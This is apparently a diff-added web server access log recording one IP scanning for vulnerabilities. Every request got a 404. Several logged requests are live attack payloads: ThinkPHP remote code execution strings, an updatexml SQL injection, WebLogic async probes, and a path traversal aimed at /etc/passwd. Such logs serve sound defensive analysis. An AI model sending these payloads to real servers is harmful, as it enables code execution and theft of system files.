+INFO:     9.135.100.135:60334 - "POST /login/userverify.cgi HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60344 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60382 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60454 - "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60468 - "GET /web/admin/setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60532 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60604 - "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60606 - "POST /?s=index/index/index HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60686 - "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60780 - "POST /index.php?s=captcha HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60786 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60838 - "GET /api/cluster/global HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60910 - "GET /setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60928 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60952 - "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60986 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32874 - "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37630 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:38670 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:53900 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:53934 - "GET /_async/favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:53968 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
